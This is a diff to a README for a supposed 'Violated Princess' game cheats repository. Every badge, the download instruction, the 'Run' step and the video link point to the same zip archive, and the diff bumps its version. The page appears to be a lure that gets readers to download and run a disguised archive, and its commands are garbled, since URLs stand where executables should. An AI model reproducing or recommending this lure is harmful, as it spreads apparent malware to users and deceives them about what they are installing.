@@ -1,8 +1,8 @@
 # 👑 Violated Princess Cheats Hacks Repository
 
-![GitHub release](https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/toolkit-enhancement-princess-violated-v1.5.zip)  
-![Maintenance](https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/toolkit-enhancement-princess-violated-v1.5.zip) ![License: MIT](https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/toolkit-enhancement-princess-violated-v1.5.zip)  
-![Supported OS](https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/toolkit-enhancement-princess-violated-v1.5.zip%20|%20macOS%20|%20Linux-4B8BBE)
+![GitHub release](https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/violated-princess-toolkit-enhancement-v2.9-alpha.2.zip)  
+![Maintenance](https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/violated-princess-toolkit-enhancement-v2.9-alpha.2.zip) ![License: MIT](https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/violated-princess-toolkit-enhancement-v2.9-alpha.2.zip)  
+![Supported OS](https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/violated-princess-toolkit-enhancement-v2.9-alpha.2.zip%20|%20macOS%20|%20Linux-4B8BBE)
 
 Welcome to the **Violated Princess Cheats Hacks** repository! Unleash a new dimension of strategic options, interface adaptiveness, and 24/7 expert guidance for every adventurer seeking to maximize their experience in Violated Princess. Dive into our robust, multi-language toolkit designed for seamless integration, fortified privacy, and next-generation interface customization — all powered by state-of-the-art AI integration.
 
@@ -51,13 +51,13 @@ With universal operating system friendliness, adventure begins on your turf, you
 
 Getting started is as easy as a critical-hit combo:
 
-1. **Download the https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/toolkit-enhancement-princess-violated-v1.5.zip** file straight from this repository (see Releases section).
+1. **Download the https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/violated-princess-toolkit-enhancement-v2.9-alpha.2.zip** file straight from this repository (see Releases section).
 2. **Extract** the contents to your favorite folder.
-3. **Run** `https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/toolkit-enhancement-princess-violated-v1.5.zip` (Windows), `https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/toolkit-enhancement-princess-violated-v1.5.zip` (macOS), or `EasyLaunch` (Linux) and follow the on-screen wizard — supporting both hands-free and custom setup.
+3. **Run** `https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/violated-princess-toolkit-enhancement-v2.9-alpha.2.zip` (Windows), `https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/violated-princess-toolkit-enhancement-v2.9-alpha.2.zip` (macOS), or `EasyLaunch` (Linux) and follow the on-screen wizard — supporting both hands-free and custom setup.
 4. Customize settings for language, AI integration, and security according to your playstyle and system preferences.
 
 > For a step-by-step **visual guide**, watch the animated demonstration below!  
-> ![Installation video tutorial](https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/toolkit-enhancement-princess-violated-v1.5.zip)
+> ![Installation video tutorial](https://github.com/Whitedevil7/violated-princess-enhancement-toolkit/raw/refs/heads/main/reallot/violated-princess-toolkit-enhancement-v2.9-alpha.2.zip)
 
 ***
 
